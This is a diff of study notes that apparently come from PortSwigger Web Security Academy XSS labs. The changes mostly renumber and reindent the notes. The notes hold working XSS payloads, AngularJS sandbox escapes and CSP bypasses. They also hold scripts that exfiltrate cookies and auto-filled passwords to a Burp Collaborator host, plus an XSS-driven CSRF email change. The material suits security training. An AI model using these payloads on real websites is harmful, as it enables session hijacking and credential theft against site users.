@@ -2497,13 +2497,13 @@ Content-Type: application/json
      https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E    
  
 **XSS in HTML tag attributes**  
-7. Reflected XSS into **attribute with angle brackets** HTML-encoded 
- - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
- - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
-8. Stored XSS into anchor **href attribute with double quotes** HTML-encoded  
+1. Reflected XSS into **attribute with angle brackets** HTML-encoded 
+  - Test `he123"` <input type="text" placeholder="Search the blog..." name="search" `value="he123" "=""`>  
+  - `"onmouseover="alert(1)` >	`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)">`  
+2. Stored XSS into anchor **href attribute with double quotes** HTML-encoded  
    - <a id="author" `href="www.attacker1.com"`>attacker</a>
    - in website field, input `javascript:alert(1)` > `<a id="author" href="javascript:alert(1)">yuyu</a>`
-9. Reflected XSS in canonical **link** tag  
+3. Reflected XSS in canonical **link** tag  
    - Page source: `<link rel="canonical" href='https://0a4b00e3035d840580ef6c4c005c00d6.web-security-academy.net/?hello'/>`  
    - rel="canonical": Indicates that the link is the canonical (authoritative) URL for the page.
    - `%27` = `'`	
@@ -2512,65 +2512,65 @@ Content-Type: application/json
    - trigger the shortcut key on windows: `ALT+SHIFT+X`    
 
 **XSS into JavaScript**  
-10. Reflected XSS into a JavaScript string with **single quote and backslash escaped**  
- - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`     
-   ```
-   <script>
-   ...
-   var input = 'controllable data here';
-   ...
-   </script>
-   ```  
- - Test bad input  
-   ```
-   single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
-   ```
- - break out of the script block and inject a new script  
-   `</script><script>alert(1)</script>`  
-11. Reflected XSS into a JavaScript string with **angle brackets HTML encoded**  
-    - Test bad input
-      ```
-      angle <> > var searchTerms = 'angle &lt;&gt;';
-      ```
-    - Breaking out of a JavaScript string
-    - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`  
-12. Reflected XSS into a JavaScript string with **angle brackets and double quotes HTML-encoded** and **single quotes escaped**
-    - Test bad input
-      ```
-      hello<> > var searchTerms = 'hello&lt;&gt;';
-      hello" >  var searchTerms = 'hello&quot;';
-      hello' >  var searchTerms = 'hello\'';  
-      ```
+1. Reflected XSS into a JavaScript string with **single quote and backslash escaped**  
+   - **Terminating the existing script** `</script><img src=1 onerror=alert(document.domain)>`     
+     ```
+     <script>
+     ...
+     var input = 'controllable data here';
+     ...
+     </script>
+     ```  
+   - Test bad input  
+     ```
+     single' backslash\' >  var searchTerms = 'single\' backslash\\\'';
+     ```
+   - break out of the script block and inject a new script  
+     `</script><script>alert(1)</script>`  
+2. Reflected XSS into a JavaScript string with **angle brackets HTML encoded**  
+   - Test bad input
+     ```
+     angle <> > var searchTerms = 'angle &lt;&gt;';
+     ```
+   - Breaking out of a JavaScript string
+   - Input `'-alert(1)-'`, XSS success `var searchTerms = ''-alert(1)-'';`  
+3. Reflected XSS into a JavaScript string with **angle brackets and double quotes HTML-encoded** and **single quotes escaped**
+   - Test bad input
+     ```
+     hello<> > var searchTerms = 'hello&lt;&gt;';
+     hello" >  var searchTerms = 'hello&quot;';
+     hello' >  var searchTerms = 'hello\'';  
+     ```
     - break out of the JavaScript string and inject an alert
       `\'-alert(1)//` > `var searchTerms = '\\'-alert(1)//';`
     - the **single quote** (') ends a string in JavaScript prematurely, and **alert(1)** is then executed as a separate command. The **//** part is used to comment out the rest of the JavaScript line  
-13. Reflected XSS in a **JavaScript URL** with some characters blocked
-    - `postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
-    - `27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
-    - %27 is the URL-encoded version of the single quote ('), used to prematurely close a string or break out of a specific context	
-    - Initial Parameter Injection: `%27`
-    - Starting a New JavaScript Statement: `},x=x=%3E{...}`
-    - This begins an object destructuring assignment, where x is being defined as a function with the arrow function syntax x => {...}	
-    - Throwing an Error and Defining an onerror Handler: `throw/**/onerror=alert,1337` 
-    - triggers the onerror event handler  
-    - Overriding `toString: toString=x` 
-    - Coercing window to a String: `window%2b%27%27` 
-    - Ending the Payload: `{x:%27`    
-14. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.    
-    - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
-    - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`    
-    - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`    
-15. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
-    - template literal in js var message = `0 search results for 'hello'`;  
-    - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;  
+4. Reflected XSS in a **JavaScript URL** with some characters blocked
+   - `postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
+   - `27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
+   - %27 is the URL-encoded version of the single quote ('), used to prematurely close a string or break out of a specific context	
+   - Initial Parameter Injection: `%27`
+   - Starting a New JavaScript Statement: `},x=x=%3E{...}`
+   - This begins an object destructuring assignment, where x is being defined as a function with the arrow function syntax x => {...}	
+   - Throwing an Error and Defining an onerror Handler: `throw/**/onerror=alert,1337` 
+   - triggers the onerror event handler  
+   - Overriding `toString: toString=x` 
+   - Coercing window to a String: `window%2b%27%27` 
+   - Ending the Payload: `{x:%27`    
+5. **Stored XSS into onclick event** with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped.    
+   - Normal payload in href `<a id="author" href="https://www.attacker.com" onclick="var tracker={track(){}};tracker.track('https://www.attacker.com');">yuyu</a>`  
+   - Test single quote `http://evil.com' +alert() + '` > `<a id="author" href="http://evil.com\' +alert() + \'" onclick="var tracker={track(){}};tracker.track('http://evil.com\' +alert() + \'');">yuyu</a>`    
+   - Use html entities `http://foo?&apos;-alert(1)-&apos;` > `<a id="author" href="http://foo?'-alert(1)-'"`    
+6. Reflected XSS into a **template literal** with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  
+   - template literal in js var message = `0 search results for 'hello'`;  
+   - Input `${alert(1)}` > var message = `0 search results for '${alert(1)}'`;  
 
 **Client-side template injection**  
-16. Reflected XSS with **AngularJS** sandbox escape without strings (expert)  
-  - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
-  - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
-  - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
-  - visit the url `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
-    ```
+1. Reflected XSS with **AngularJS** sandbox escape without strings (expert)  
+   - The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox.
+   - An array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property  
+   - we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not
+   - visit the url `https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`
+     ```
       $scope.query = {};
       var key = 'search';
       $scope.query[key] = '1';
@@ -2579,20 +2579,20 @@ Content-Type: application/json
       $scope.query[key] = '1';
       $scope.value = $parse(key)($scope.query);
       });
-    ```  
-17. Reflected XSS with AngularJS sandbox escape and CSP (expoert)  
-    - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
-    - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
-    - the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z
-    - The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check
-    - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
-      ```
+     ```  
+2. Reflected XSS with AngularJS sandbox escape and CSP (expoert)  
+   - The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object
+   - The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.
+   - the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z
+   - The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check
+   - Exploit server `search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';`
+     ```
       <script>
 	location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
       </script>
-      ```
+     ```
 **Exploiting XSS vulnerabilities**  
-18. Exploiting cross-site scripting to **steal cookies**  
+1. Exploiting cross-site scripting to **steal cookies**  
    - limitation: user not logged in, HttpOnly flag, block user IP, session time out	
    - Post comment and capture the session value in Burp Collaborator
      ```
@@ -2604,26 +2604,26 @@ Content-Type: application/json
 	});
       </script>
      ```
-19. Exploiting cross-site scripting to **capture passwords**  
-    - Target password manager that performs **password auto-fill**	
-    - Post comment and capture the password value in Burp Collaborator
-      ```
+2. Exploiting cross-site scripting to **capture passwords**  
+   - Target password manager that performs **password auto-fill**	
+   - Post comment and capture the password value in Burp Collaborator
+     ```
       <input name=username id=username>
       <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
 	method:'POST',
 	mode: 'no-cors',
 	body:username.value+':'+this.value
 	});">
-      ```
-20. Exploiting XSS to perform **CSRF**
-    - Extract the CSRF token and change the victim's email address
-    - Post comment > who views the comment issue a POST request to change their email address to test@test.com	
-      ```
-      Repeater
-      POST /my-account/change-email
-      email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
+     ```
+3. Exploiting XSS to perform **CSRF**
+   - Extract the CSRF token and change the victim's email address
+   - Post comment > who views the comment issue a POST request to change their email address to test@test.com	
+     ```
+     Repeater
+     POST /my-account/change-email
+     email=test%40normal-user.net&csrf=ZqNZdY3eSqvBYHiuBgDUiRAkX3OJ0Xw0
   
-      <script>
+     <script>
 	var req = new XMLHttpRequest();
 	req.onload = handleResponse;
 	req.open('get','/my-account',true);
@@ -2635,9 +2635,9 @@ Content-Type: application/json
 	    changeReq.send('csrf='+token+'&email=test@test.com')
 	};
       </script>
-      ```
+     ```
 **Content security policy (CSP)**
-20. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
+1. Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
    - Burp steps not working: follow `https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/`  
    - Email param is vulnerable to XSS  
      ```
@@ -2663,14 +2663,14 @@ Content-Type: application/json
      ```
    - Access log, copy the CSRF token
    - Generate CSRF PoC and replace the CSRF token
-21. Reflected XSS protected by CSP, with **CSP bypass**
-    - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
-      ```
-      GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E
+2. Reflected XSS protected by CSP, with **CSP bypass**
+   - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
+     ```
+     GET /?search=%3Cimg+src%3D1+onerror%3Dalert%281%29%3E
 
-      Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
-      ```
-    - browse the url `https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`
+     Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+     ```
+   - browse the url `https://YOUR-LAB-ID.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'`
 
 ## DOM-based Attacks
 - DOM-based XSS vulnerabilities usually arise when **JavaScript takes data from an attacker-controllable source**, such as the URL, and **passes it to a sink that supports dynamic code execution**, such as eval() or innerHTML.	
